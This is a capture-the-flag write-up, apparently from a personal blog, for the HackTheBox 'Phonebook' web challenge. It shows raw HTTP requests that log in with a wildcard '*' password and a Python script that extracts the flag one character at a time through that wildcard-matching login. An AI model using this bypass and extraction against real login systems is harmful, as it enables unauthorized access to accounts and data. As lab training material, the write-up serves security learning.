---
title: Phonebook
categories: [writeups,HackTheBox]
tags: [web]
---

## Description

- Name: **Phonebook**
- Platform: **HackTheBox**
- Difficulty: **Easy**
- CTF Category: **Web**
- Comments on the box: 
> **Its like a SQL injection in a weird way**

## Method to solve

- Since it is a web challenge, lets start by going into the url.

![](/assets/img/posts/2023-06-20-Phonebook/2023-06-20-Phonebook-15-32-40.png)

- Based on the web applicatiob, there is a interesting information which is a username provided for us. 
- Aside from that, we dont really have much information. 
- lets try to perform some common brute forcing and simple sql injection.

```bash
POST /login HTTP/1.1
Host: 178.128.45.143:30589
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://178.128.45.143:30589
Connection: close
Referer: http://178.128.45.143:30589/login
Cookie: mysession=MTY4NzI0NjIzNXxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fDnqgipShqNuxh6mc5T303sMKGdE9ONcyknpvUOm2Qsb
Upgrade-Insecure-Requests: 1

username=Reese&password=*
```

- By using `*` as password, we manged to login into the system. 

![](/assets/img/posts/2023-06-20-Phonebook/2023-06-20-Phonebook-16-09-03.png)

- Inside the web application, there is only one search function which should be our to go section.
- lets try and see the result it gave. 

![](/assets/img/posts/2023-06-20-Phonebook/2023-06-20-Phonebook-16-15-43.png)

- Based on the result, it just give us information of the user, email and phone number but not flag.
- The only things which might be flag is the password since we could just login with `*`.
- Since we know the flag format is start with `HTB`, we could try to insert and check if it allows us to login into the system.

```bash
## request
POST /login HTTP/1.1
Host: 178.128.45.143:30589
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://178.128.45.143:30589
Connection: close
Referer: http://178.128.45.143:30589/login
Cookie: mysession=MTY4NzI0ODM4MXxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fI0i0S6hbHVh9aPTwjLTLOi2Q9ok12auO8cPrIfAkUzi
Upgrade-Insecure-Requests: 1

username=Reese&password=HTB*

## result
HTTP/1.1 302 Found
Location: /
Set-Cookie: mysession=MTY4NzI0OTc1OHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fIFtredwWTMIAuVtT3d106P_YvPlHg27gytFJWRMErw3; Path=/; Expires=Thu, 20 Jul 2023 08:29:18 GMT; Max-Age=2592000
Date: Tue, 20 Jun 2023 08:29:18 GMT
Content-Length: 0
Connection: close

```

- Now that we know that the password is the flag, we could just try to perform brute force.
- I will do it with python script but using burpsuite should be fine.

### Python Script

```py
import requests
from string import ascii_lowercase, ascii_uppercase

url = 'http://178.128.45.143:30589/login'
headers = {'Host':'178.128.45.143:30589', 'User-Agent':'Mozilla/5.0 Firefox/78.0',
'Content-Type':'application/x-www-form-urlencoded', 'Connection':'close'}

chars = ascii_lowercase+ascii_uppercase+'0123456789_{}()'
password = "HTB{"

while password[-1] != '}' :
    for char in chars:
        fpass = password+char+'*'
        data = {'username':'reese','password':fpass}
        r = requests.post(url, headers=headers, data=data)

        if r.headers['Content-Length'] == '2586':
            password += char
            print(password)
            break

```

## Things i learned today
- build ur own script with python
- weird SQL injection